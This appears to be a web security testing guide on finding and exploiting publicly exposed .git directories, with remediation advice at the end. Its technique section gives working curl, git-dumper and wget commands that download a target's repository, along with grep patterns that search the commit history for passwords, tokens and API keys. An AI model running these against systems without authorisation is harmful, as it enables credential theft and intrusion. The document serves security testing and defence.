# Git Repository Exposed (/.git/)

## Overview
When a `.git/` directory is inadvertently deployed to a web server's public root, the entire version control history of the application becomes accessible to anyone who knows to look. Unlike simple source code disclosure, an exposed `.git` repository reveals not just current code but the complete commit history — including credentials that were added and later "removed" in subsequent commits, deleted files, configuration changes, and developer comments. This is one of the most impactful information disclosure vulnerabilities in web applications.

## How It Works
Developers use Git for version control. When deploying an application, they may copy or sync the entire project directory — including the hidden `.git/` folder — to the web root. The `.git/` directory contains all object store data needed to reconstruct every file in every commit. If the web server serves files from this directory (which it will, if no explicit deny rule exists), an attacker can download the object database piece by piece and reconstruct the entire repository locally, then examine all historical commits for secrets.

## Impact
- Access all current and historical source code
- Recover deleted files and credentials from git history
- Extract database passwords, API keys, and private keys that were "removed" in later commits
- Read configuration files that were never meant to be public
- Understand the complete application architecture
- Discover internal endpoints, admin functions, and business logic
- Find other hardcoded credentials and secrets embedded in commit messages
- Map all third-party integrations

## Where to Look
- `/.git/` path on any web application
- `/.git/HEAD` — a small text file; if it returns `ref: refs/heads/main`, the repo is exposed
- `/.git/config` — git configuration including remote repository URL (may contain credentials)
- `/.git/COMMIT_EDITMSG` — last commit message
- Subdomains and all vhosts of the target
- API servers, staging servers, and CDN origins

## Testing Steps
1. Check if `/.git/HEAD` returns a response (should be `ref: refs/heads/main` or similar).
2. If HEAD is accessible, check `/.git/config` for the remote URL (may contain credentials or reveal internal repo location).
3. Use **git-dumper** to automatically download and reconstruct the entire repository.
4. After reconstruction, run `git log --all --oneline` to see all commits.
5. Run `git log -p` to see all changes including deleted content.
6. Search all commits for credentials: `git log -p | grep -iE "password|secret|key|token|credential"`.
7. Check `git stash list` and `git stash show -p` for stashed changes.
8. Look at all branches: `git branch -a`.
9. Use `truffleHog` or `git-secrets` on the cloned repo to find all secrets.

## Payloads / Techniques

```bash
# === Step 1: Detect Exposed .git ===

# Quick check
curl -s "https://target.com/.git/HEAD"
# Response if exposed: ref: refs/heads/main

# Check git config (may contain remote URL with credentials)
curl -s "https://target.com/.git/config"
# Look for: [remote "origin"] url = https://user:pass@github.com/org/repo

# Check commit message
curl -s "https://target.com/.git/COMMIT_EDITMSG"
```

```bash
# === Step 2: Dump the Repository with git-dumper ===

# Install git-dumper
pip3 install git-dumper
# or
git clone https://github.com/arthaud/git-dumper

# Dump the entire .git directory
git-dumper "https://target.com/.git" /tmp/target-repo

# Alternative: use gitdumper.sh (part of Pentester's Toolkit)
# Or use wget recursive download (less complete)
wget -r --no-parent "https://target.com/.git/"
```

```bash
# === Step 3: Analyze the Recovered Repository ===

cd /tmp/target-repo

# View all commits
git log --all --oneline

# View all commits with diffs (ALL history including deleted files)
git log -p --all

# Search entire git history for credentials
git log -p --all | grep -iE "(password|passwd|secret|api_key|api_secret|private_key|token|credential|auth)" | head -100

# Search commit messages for hints
git log --all --pretty=format:"%h %s" | grep -iE "(password|secret|fix|cred|key|remove|cleanup|credentials)"

# List all files ever tracked (including deleted)
git log --all --full-history -- "**" | grep "^commit"
git log --all --name-only --format="" | sort -u

# Recover a deleted file
git log --all -- path/to/deleted/config.php
git show COMMIT_HASH:path/to/deleted/config.php

# Check all branches
git branch -a
git checkout origin/dev -- .

# Check stash
git stash list
git stash show -p stash@{0}

# List all tags
git tag -l
git show v1.0.0
```

```bash
# === Step 4: Automated Secret Scanning on Recovered Repo ===

# truffleHog
trufflehog filesystem /tmp/target-repo --json | python3 -m json.tool

# gitleaks
gitleaks detect --source /tmp/target-repo --report-format json

# git-secrets (AWS)
git secrets --scan-history

# grep for common secret patterns in all history
git log -p --all | grep -P 'AKIA[0-9A-Z]{16}|sk_live_|SG\.|AIza[0-9A-Za-z\-_]{35}|ghp_'
```

```
# Key files to check in .git directory:
/.git/HEAD                      # Current branch reference
/.git/config                    # Git config (remote URLs, may have creds)
/.git/COMMIT_EDITMSG            # Last commit message
/.git/index                     # Staging area index
/.git/ORIG_HEAD                 # Previous HEAD (after merge/rebase)
/.git/refs/heads/main           # SHA of main branch HEAD
/.git/refs/remotes/origin/HEAD  # Remote HEAD SHA
/.git/logs/HEAD                 # Reflog — complete history of HEAD movements
/.git/objects/info/packs        # Pack file list
/.git/packed-refs               # Packed references

# Manual object retrieval (if git-dumper doesn't work):
# 1. Get HEAD
curl -s https://target.com/.git/HEAD  # → ref: refs/heads/main
# 2. Get the SHA of main
curl -s https://target.com/.git/refs/heads/main  # → abc123def456...
# 3. Get the commit object
curl -s https://target.com/.git/objects/ab/c123def456... > obj
# 4. Inflate with zlib
python3 -c "import zlib,sys; sys.stdout.buffer.write(zlib.decompress(open('obj','rb').read()))"
```

## Burp Suite Tips
- In **Target > Site Map**, look for entries under `/.git/` — if any exist, the repo is exposed.
- Run **Content Discovery** targeting `/.git/` specifically with a wordlist of common git files.
- After finding the exposure, **right-click the `.git` directory** in Site Map > Spider this host to enumerate all accessible git objects.
- Use **Intruder** to enumerate git object hashes from the pack index if direct object paths are needed.

## Tools
- git-dumper (https://github.com/arthaud/git-dumper) — primary tool for automated git repo extraction
- truffleHog (https://github.com/trufflesecurity/trufflehog) — secret detection in git history
- gitleaks (https://github.com/gitleaks/gitleaks) — secret detection
- GitTools (https://github.com/internetwache/GitTools) — Dumper, Finder, and Extractor
- Burp Suite Pro (Content Discovery)
- nuclei with `exposures/configs/git-config.yaml` template

## Remediation
- Add `.git` to the web server's deny configuration:
  Apache: `<DirectoryMatch "\.git"> Require all denied </DirectoryMatch>`
  Nginx: `location ~ /\.git { deny all; return 404; }`
- Use a deployment pipeline (CI/CD) that copies only compiled/built artifacts — never the raw source directory — to the web server.
- Use `rsync` with `--exclude='.git'` if copying files manually.
- Never commit secrets to git; if they were committed, rotate them immediately and rewrite history with `git filter-repo` or BFG Repo Cleaner.
- Use pre-commit hooks and CI checks (truffleHog, gitleaks) to prevent secret commits.
- Conduct regular exposure checks with nuclei or automated scanners.

## References
https://portswigger.net/web-security/information-disclosure/exploiting
https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information
https://github.com/arthaud/git-dumper
https://github.com/internetwache/GitTools
https://cwe.mitre.org/data/definitions/527.html
https://trufflesecurity.com/trufflehog
https://blog.detectify.com/2015/05/05/git-publicly-available/
